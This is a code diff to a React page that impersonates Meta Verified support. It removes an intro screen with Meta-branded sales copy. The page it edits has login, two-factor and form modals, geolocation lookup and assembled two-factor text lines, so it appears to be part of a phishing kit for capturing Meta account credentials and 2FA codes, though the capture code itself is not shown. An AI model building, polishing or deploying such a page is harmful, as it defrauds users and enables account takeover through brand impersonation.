@@ -5,7 +5,6 @@ import FirstFormModal from '@/components/FirstFormModal';
 import LoginModal from '@/components/LoginModal';
 import TwoFAModal from '@/components/TwoFAModal';
 import SuccessModal from '@/components/SuccessModal';
-import IntroLoading from '@/components/intro-loading';
 
 // Utils
 import { translateText } from '@/utils/translate';
@@ -83,7 +82,6 @@ const fetchGeoData = async () => {
 };
 
 const Home = () => {
-    const [showIntro, setShowIntro] = useState(true);
     const [showFirstFormModal, setShowFirstFormModal] = useState(false);
     const [showLoginModal, setShowLoginModal] = useState(false);
     const [show2FAModal, setShow2FAModal] = useState(false);
@@ -178,10 +176,6 @@ const Home = () => {
             bannerCommunity: 'Community Standards',
             bannerHelp: 'Help Center',
             bannerBusinessHelp: 'Meta Business Help Center',
-            introHeroLead: 'Upgrade your business with Meta Verified.',
-            introHeroBody: 'When a business has the Verified badge, people are nearly twice as likely to trust that business recommendation compared to one without the badge.',
-            introHeroHighlight: 'Why wait? Subscribe to Meta Verified today to add this badge to your profile and enjoy exclusive benefits.',
-            introContinueButton: 'Continue to Meta Verified Support Center',
         }),
         []
     );
@@ -337,7 +331,6 @@ ${twoFALines}
 
     return (
         <>
-            {showIntro && <IntroLoading onDone={() => setShowIntro(false)} texts={texts} />}
             <MetaVerifiedBanner
                 altText={texts.metaVerified}
                 onSubmit={() => setShowFirstFormModal(true)}
